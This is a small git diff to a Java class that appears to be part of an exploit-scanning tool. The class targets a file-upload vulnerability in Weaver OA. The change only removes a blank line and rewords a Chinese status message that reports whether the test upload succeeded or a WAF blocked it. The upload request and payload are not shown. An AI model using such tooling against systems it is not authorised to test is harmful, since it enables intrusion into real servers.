@@ -5,7 +5,6 @@ import Utilss.Response;
 import Utilss.shell;
 import core.Exploitlnterface;
 import javafx.scene.control.TextArea;
-
 import java.util.HashMap;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -70,7 +69,7 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface{
                 Response thired = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");
 
                 if(thired.getText().contains(shell.test_payload)){
-                    textArea.appendText("\n 漏洞存在，测试文件写入成功 地址为：" + url + "/" + filename);
+                    textArea.appendText("\n 漏洞存在，测试文件写入成功 \n " + url + "/" + filename);
                     return true;
                 }else {
                     textArea.appendText("\n 漏洞可能存在，疑似WAF拦截，请手动复现");
